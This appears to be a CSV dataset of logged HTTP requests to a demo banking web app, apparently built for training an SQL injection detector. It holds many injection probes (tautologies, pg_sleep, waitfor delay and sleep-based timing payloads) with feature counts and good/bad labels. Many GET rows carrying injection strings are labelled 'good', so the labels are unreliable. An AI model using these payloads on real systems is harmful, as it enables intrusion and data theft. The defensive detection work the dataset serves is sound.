method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/subscribe.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/pr,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=-1'%20OR%203*2<(0%2B5%2B914-914)%20or%20'QmbTa8Nm'='&uid=1,/doLogin,8,0,0,2,4,2,bad
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
POST,"submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=1'""&name=zFPWdwPk&subject=1",/sendFeedback,2,2,0,0,2,0,bad
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,"/Privacypolicy.jsp?sec=Careers&template=-1""%20OR%203%2B773-773-1=0%2B0%2B0%2B1%20--%20",0,0,0,0,0,0,good
POST,"-1""%20OR%202%2B367-367-1=0%2B0%2B0%2B1%20--%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1",/sendFeedback,0,2,2,0,4,0,bad
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/index.jsp?content=personal_savings.htm,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,"/search.jsp?query=%BF'%BF""",0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=rhzzyrVw';select%20pg_sleep(9);%20--%20,/doLogin,2,0,2,2,3,6,bad
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp?sec=%40%40cV9uE&template=US,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=-1'%20OR%203*2*0=6%20AND%20000623=000623%20or%20'bkqL7jUZ'='&uid=e,/doLogin,8,0,0,0,6,2,bad
GET,,/disclaimer.htm,0,0,0,0,0,0,good
POST,-1'%20OR%202%2B893-893-1=0%2B0%2B0%2B1%20or%20'sZWJ8A87'='&passw=g00dPa%24%24w0rD&uid=e,/doLogin,8,0,0,0,4,2,bad
GET,,/index.jsp?content=inside_jobs.htm'%20AND%202*3*8=6*8%20AND%20'l71s'='l71s&job=OperationalRiskManager:RiskManagement,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_jobs.htm%25'%20AND%202*3*8=6*8%20AND%20'2UAt'!='2UAt%25&job=OperationalRiskManager:RiskManagement,0,0,0,0,0,0,good
GET,,"/index.jsp?content=inside_contact.htm""%20AND%202*3*8=6*8%20AND%20""b2P7""=""b2P7",0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,"/default.jsp?content=-1""%20OR%202%2B176-176-1=0%2B0%2B0%2B1%20--%20",0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/robots.txt,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,"/index.jsp?content=%F0''%F0""""&job=MortgageLendingAccountExecutive:Sales",0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=2U18J0RI&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,0,0,0,0,2,0,bad
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=-1%20OR%202%2B47-47-1=0%2B0%2B0%2B1&job=MortgageLendingAccountExecutive:Sales,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=-1%20OR%202%2B248-248-1=0%2B0%2B0%2B1&job=Teller:ConsumaerBanking,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=personal.htm,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/default.jsp?content=-1%20OR%202%2B591-591-1=0%2B0%2B0%2B1%20--%20,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1%00%C0%A7%C0%A2%252527%252522&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,0,0,0,0,2,0,bad
GET,,/survey_questions.jsp?step=-1%20OR%203%2B491-491-1=0%2B0%2B0%2B1%20--%20,0,0,0,0,0,0,good
GET,,/disclaimer.htm?url=%40%40LC7of,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_executives.htm,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst%25'%20AND%202*3*8=6*8%20AND%20'V6AW'!='V6AW%25&name=zFPWdwPk&subject=1,/sendFeedback,8,0,0,0,6,0,bad
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,"/index.jsp?content=inside_jobs.htm""%20AND%202*3*8=6*8%20AND%20""JH9N""=""JH9N&job=LoyaltyMarketingProgramManager:Marketing",0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp?HostName=1%20waitfor%20delay%20'0:0:6'%20--%20,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=-1'%20OR%203*2*0=6%20AND%20914=914%20or%20'QmbTa8Nm'='&uid=1,/doLogin,8,0,0,0,6,2,bad
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1;select%20pg_sleep(9);%20--%20,/doLogin,0,0,2,2,3,6,bad
GET,,"/index.jsp?content=%BF'%BF""&job=MortgageLendingAccountExecutive:Sales",0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=Uq3Nnkr0&subject=1,/sendFeedback,0,0,0,0,2,0,bad
GET,,/swagger/swagger-ui-bundle.js,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=h1h3PD61');select%20pg_sleep(9);%20--%20&job=LoyaltyMarketingProgramManager:Marketing,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,"/Privacypolicy.jsp?sec=Careers&template=-1""%20OR%202%2B773-773-1=0%2B0%2B0%2B1%20--%20",0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=-1'%20OR%2000027=00027%20AND%203%2B1-1-1=1%20or%20'kQWwwMxI'='&uid=1,/doLogin,8,0,0,0,6,2,bad
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp?HostName=AltoroMutual,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=xIvNgiSw');select%20pg_sleep(9);%20--%20,/doLogin,2,0,2,2,3,6,bad
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_contact.htm,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=-1'%20OR%203*2=6%20AND%2000027=00027%20or%20'kQWwwMxI'='&uid=1,/doLogin,8,0,0,0,6,2,bad
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
POST,"submit=%20Submit%20&cfile=comments.txt&comments=%F0''%F0""""&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1",/sendFeedback,4,4,0,0,2,0,bad
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=-1'%20OR%202%2B623-623-1=0%2B0%2B0%2B1%20or%20'bkqL7jUZ'='&uid=e,/doLogin,8,0,0,0,4,2,bad
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,"/Privacypolicy.jsp?sec=1'""&template=US",0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_jobs.htm&job=CustomerServiceRepresentative:CustomerService,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_jobs.htm,0,0,0,0,0,0,good
GET,,"/index.jsp?content=inside_jobs.htm""%20AND%202*3*8=6*8%20AND%20""M9Hj""=""M9Hj&job=CustomerServiceRepresentative:CustomerService",0,0,0,0,0,0,good
POST,btnSubmit=Subscribe&txtEmail=1%20waitfor%20delay%20'0:0:15'%20--%20,/doSubscribe,4,0,2,0,5,4,bad
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,"/Privacypolicy.jsp?sec=Careers&template=%BF'%BF""",0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/index.jsp?content=1%00%C0%A7%C0%A2%252527%252522&job=CustomerServiceRepresentative:CustomerService,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,"/index.jsp?content=%BF'%BF""",0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
POST,"submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=(select(0)from(select(sleep(9)))v)/*'%2B(select(0)from(select(sleep(9)))v)%2B'""%2B(select(0)from(select(sleep(9)))v)%2B""*/&subject=1",/sendFeedback,4,4,0,30,2,18,bad
GET,,/index.jsp?content=inside_jobs.htm%25'%20AND%202*3*8=6*8%20AND%20'QccO'!='QccO%25&job=CustomerServiceRepresentative:CustomerService,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/my%20documents/JohnSmith/,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,"/index.jsp?content=inside_jobs.htm""%20AND%202*3*8=6*8%20AND%20""isXH""=""isXH&job=ExecutiveAssistant:Administration",0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=JyI=&uid=1,/doLogin,0,0,0,0,0,2,bad
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/survey_questions.jsp?step=a%25'%20AND%202*3*8=6*8%20AND%20'hilc'!='hilc%25,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,"/util/serverStatusCheckService.jsp?HostName=-1""%20OR%202%2B675-675-1=0%2B0%2B0%2B1%20--%20",0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/index.jsp?content=%40%40fZUJb&job=ExecutiveAssistant:Administration,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=-1'%20OR%202%2B897-897-1=0%2B0%2B0%2B1%20--%20&uid=e,/doLogin,2,0,2,0,4,2,bad
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp?step=B29Ysx2j');select%20pg_sleep(5);%20--%20,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,"/search.jsp?query=%F0''%F0""""",0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1);%20waitfor%20delay%20'0:0:9'%20--%20,/doLogin,4,0,2,0,5,6,bad
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=JyI=&job=OperationalRiskManager:RiskManagement,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=%5C&uid=e,/doLogin,0,0,0,0,0,2,bad
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,"/disclaimer.htm?url=-1""%20OR%203*2<(0%2B5%2B995-995)%20--%20",0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
POST,ZFWYwLHH';%20waitfor%20delay%20'0:0:3'%20--%20&txtEmail=sample%40email.tst,/doSubscribe,6,0,2,0,5,4,bad
POST,btnSubmit=Login&passw=-1'%20OR%203*2*0=6%20AND%2000027=00027%20or%20'kQWwwMxI'='&uid=1,/doLogin,8,0,0,0,6,2,bad
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,"/Privacypolicy.jsp?sec=(select(0)from(select(sleep(9)))v)/*'%2B(select(0)from(select(sleep(9)))v)%2B'""%2B(select(0)from(select(sleep(9)))v)%2B""*/&template=US",0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=sR262utz';select%20pg_sleep(3);%20--%20&job=LoyaltyMarketingProgramManager:Marketing,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/Documents/JohnSmith/,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp?sec=Careers&template=3eEkWfvC'));select%20pg_sleep(6);%20--%20,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,"/index.jsp?content=inside_jobs.htm&job=1'""",0,0,0,0,0,0,good
POST,"-1""%20OR%202%2B891-891-1=0%2B0%2B0%2B1%20--%20&txtEmail=sample%40email.tst",/doSubscribe,0,2,2,0,4,0,bad
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1*271*266*0&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,0,0,0,0,2,0,bad
POST,"submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=0""XOR(if(now()=sysdate()%2Csleep(9)%2C0))XOR""Z&name=zFPWdwPk&subject=1",/sendFeedback,0,4,0,10,2,2,bad
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_jobs.htm&job=%40%40Xw61y,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=%40%40IkIYI&job=LoyaltyMarketingProgramManager:Marketing,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=JyI=,/sendFeedback,0,0,0,0,2,0,bad
GET,,/default.jsp,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=-1'%20OR%203*2>(0%2B5%2B23-23)%20or%20'pfTIODsN'='&uid=e,/doLogin,8,0,0,2,4,2,bad
POST,btnSubmit=Login&passw=-1'%20OR%20914=914%20AND%203%2B1-1-1=1%20or%20'QmbTa8Nm'='&uid=1,/doLogin,8,0,0,0,6,2,bad
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/index.jsp?content=JyI=&job=LoyaltyMarketingProgramManager:Marketing,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=HUjVdRur');select%20pg_sleep(21);%20--%20&job=MortgageLendingAccountExecutive:Sales,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=%5C&job=ExecutiveAssistant:Administration,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,"/survey_questions.jsp?step=0""XOR(if(now()=sysdate()%2Csleep(5)%2C0))XOR""Z",0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=-1%20OR%202%2B443-443-1=0%2B0%2B0%2B1&uid=1,/doLogin,0,0,0,0,2,2,bad
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
POST,JyI=&passw=g00dPa%24%24w0rD&uid=1,/doLogin,0,0,0,0,0,2,bad
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=-1%20OR%203%2B446-446-1=0%2B0%2B0%2B1,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
POST,btnSubmit=Subscribe&txtEmail=C1HpdIzu'));select%20pg_sleep(15);%20--%20,/doSubscribe,2,0,2,2,3,4,bad
GET,,/default.jsp,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=-1'%20OR%202%2B1-1-1=1%20AND%20914=914%20or%20'QmbTa8Nm'='&uid=1,/doLogin,8,0,0,0,6,2,bad
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
POST,"btnSubmit=Subscribe&txtEmail=%BF'%BF""",/doSubscribe,2,2,0,0,0,0,bad
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=-1%20OR%202%2B530-530-1=0%2B0%2B0%2B1%20--%20&job=MortgageLendingAccountExecutive:Sales,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=1%00%C0%A7%C0%A2%252527%252522&subject=1,/sendFeedback,0,0,0,0,2,0,bad
GET,,/util/,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
